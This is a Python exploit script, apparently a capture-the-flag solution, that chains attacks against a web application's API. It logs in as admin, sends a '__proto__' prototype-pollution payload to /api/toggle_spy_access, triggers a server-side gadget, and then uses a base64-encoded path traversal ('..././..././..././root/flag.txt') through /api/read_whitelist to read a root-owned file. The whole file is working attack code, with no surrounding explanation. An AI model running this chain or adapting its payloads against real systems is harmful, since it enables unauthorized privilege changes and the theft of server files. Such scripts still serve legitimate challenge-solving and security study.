import sys
import httpx
import base64 

def login(client: httpx.Client, username: str, secretCode: str) -> tuple[int, str]:
    data = {
        "username": username, 
        "secretCode": secretCode
    }

    r = client.post("/api/login", json=data)
    assert r.is_success, f"Login failed: {r.text}"
    
    session_cookie = r.cookies.get('session')
    
    
    return r.json()['id'], session_cookie

def ARB_W(client: httpx.Client, session_cookie: str) -> None: 
    payload = {
        "username": "bsimic",
        "isAllowed": True,
        "__proto__": {
            "developer_mode": 1337
        }
    }

    headers = {
        'Cookie': f'session={session_cookie}'
    }

    r = client.post("/api/toggle_spy_access", json=payload, headers=headers)
    assert r.json()['success'], f"[!] Failed to get arbitrary write: {r.text}"

    print("[*] Arbitrary write successful.")

def SSPP_Gadget(client: httpx.Client, session_cookie: str) -> None:
    payload = base64.b64encode("spy_bsimic.json".encode()).decode()
   
    headers = {
        'Cookie': f'session={session_cookie}'
    }

    r = client.get(f"/api/read_whitelist/{payload}", headers=headers)
    assert r.json()['developer_mode'] == 1337, f"[!] Failed to trigger SSPP Gadget: {r.text}"

    print("[*] SSPP Gadget triggered.")

def ARB_R(client: httpx.Client, session_cookie: str) -> str:
    payload = base64.b64encode("..././..././..././root/flag.txt".encode()).decode()

    headers = {
        'Cookie': f'session={session_cookie}'
    }

    r = client.get(f"/api/read_whitelist/{payload}", headers=headers)
    assert r.json()['content'], f"[!] Failed to read flag file: {r.text}"

    print("[*] Flag read successful.")
    return r.json()['content'].rstrip()

def exploit(ip: str, ADMIN_CODE: str):
    BASE_URL = f"{ip}"
    client = httpx.Client(
        base_url=BASE_URL,
        verify=False,
        follow_redirects=True,
        proxies={"http://": "http://127.0.0.1:8080", "https://": "http://127.0.0.1:8080"}
    )

    user_id, session_cookie = login(client, "admin", ADMIN_CODE)
    print(f"[*] Logged in as admin with ID {user_id}")

    ARB_W(client, session_cookie)
    SSPP_Gadget(client, session_cookie)

    flag = ARB_R(client, session_cookie)
    print(f"[*] Flag: {flag}")


if __name__ == "__main__":
    TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "http://0.0.0.0:3000"
    ADMIN_CODE = sys.argv[2] if len(sys.argv) > 2 else "admin"

    exploit(TARGET_IP, ADMIN_CODE)